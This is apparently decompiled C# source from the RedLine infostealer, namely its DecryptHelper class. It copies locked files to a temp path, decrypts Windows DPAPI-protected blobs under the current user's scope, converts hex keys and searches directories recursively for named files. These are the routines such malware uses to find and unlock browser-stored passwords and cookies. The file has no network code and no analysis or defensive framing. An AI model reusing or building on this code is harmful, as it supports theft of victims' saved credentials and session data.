using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace RedLine.Logic.Helpers
{
  public static class DecryptHelper
  {
    public static string Base64Decode(string input)
    {
      try
      {
        return Encoding.UTF8.GetString(Convert.FromBase64String(input));
      }
      catch
      {
        return input;
      }
    }

    public static string CreateTempCopy(string filePath)
    {
      string tempPath = DecryptHelper.CreateTempPath();
      File.Copy(filePath, tempPath, true);
      return tempPath;
    }

    public static string CreateTempPath()
    {
      return Path.Combine(Constants.TempDirectory, "tmp" + DateTime.Now.ToString("O").Replace(':', '_') + (object) Thread.CurrentThread.GetHashCode() + (object) Thread.CurrentThread.ManagedThreadId);
    }

    public static string EncryptBlob(string rawText)
    {
      return Convert.ToBase64String(ProtectedData.Protect(Encoding.Default.GetBytes(rawText), (byte[]) null, DataProtectionScope.CurrentUser));
    }

    public static string DecryptBlob(
      string EncryptedData,
      DataProtectionScope dataProtectionScope,
      byte[] entropy = null)
    {
      return Encoding.UTF8.GetString(DecryptHelper.DecryptBlob(Encoding.Default.GetBytes(EncryptedData), dataProtectionScope, entropy));
    }

    public static byte[] DecryptBlob(
      byte[] EncryptedData,
      DataProtectionScope dataProtectionScope,
      byte[] entropy = null)
    {
      try
      {
        if (EncryptedData == null || EncryptedData.Length == 0)
          return (byte[]) null;
        return ProtectedData.Unprotect(EncryptedData, entropy, dataProtectionScope);
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
        return (byte[]) null;
      }
    }

    public static byte[] ConvertHexStringToByteArray(string hexString)
    {
      if (hexString.Length % 2 != 0)
        throw new ArgumentException(string.Format((IFormatProvider) CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", (object) hexString));
      byte[] numArray = new byte[hexString.Length / 2];
      for (int index = 0; index < numArray.Length; ++index)
      {
        string s = hexString.Substring(index * 2, 2);
        numArray[index] = byte.Parse(s, NumberStyles.HexNumber, (IFormatProvider) CultureInfo.InvariantCulture);
      }
      return numArray;
    }

    public static string GetMd5Hash(string source)
    {
      return DecryptHelper.GetHexString((IList<byte>) new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(source)));
    }

    private static string GetHexString(IList<byte> bt)
    {
      string str1 = string.Empty;
      for (int index = 0; index < bt.Count; ++index)
      {
        int num1 = (int) bt[index];
        int num2 = num1 & 15;
        int num3 = num1 >> 4 & 15;
        string str2 = num3 <= 9 ? str1 + num3.ToString((IFormatProvider) CultureInfo.InvariantCulture) : str1 + ((char) (num3 - 10 + 65)).ToString((IFormatProvider) CultureInfo.InvariantCulture);
        str1 = num2 <= 9 ? str2 + num2.ToString((IFormatProvider) CultureInfo.InvariantCulture) : str2 + ((char) (num2 - 10 + 65)).ToString((IFormatProvider) CultureInfo.InvariantCulture);
        if (index + 1 != bt.Count && (index + 1) % 2 == 0)
          str1 += "-";
      }
      return str1;
    }

    public static List<string> FindPaths(
      string baseDirectory,
      int maxLevel = 4,
      int level = 1,
      params string[] files)
    {
      List<string> stringList = new List<string>();
      if (files != null && files.Length != 0)
      {
        if (level <= maxLevel)
        {
          try
          {
            foreach (string directory in Directory.GetDirectories(baseDirectory))
            {
              try
              {
                DirectoryInfo directoryInfo = new DirectoryInfo(directory);
                FileInfo[] files1 = directoryInfo.GetFiles();
                bool flag = false;
                for (int index1 = 0; index1 < files1.Length && !flag; ++index1)
                {
                  for (int index2 = 0; index2 < files.Length && !flag; ++index2)
                  {
                    string file = files[index2];
                    FileInfo fileInfo = files1[index1];
                    string name = fileInfo.Name;
                    if (file == name)
                    {
                      flag = true;
                      stringList.Add(fileInfo.FullName);
                    }
                  }
                }
                foreach (string path in DecryptHelper.FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
                {
                  if (!stringList.Contains(path))
                    stringList.Add(path);
                }
              }
              catch
              {
              }
            }
          }
          catch
          {
          }
          return stringList;
        }
      }
      return stringList;
    }
  }
}
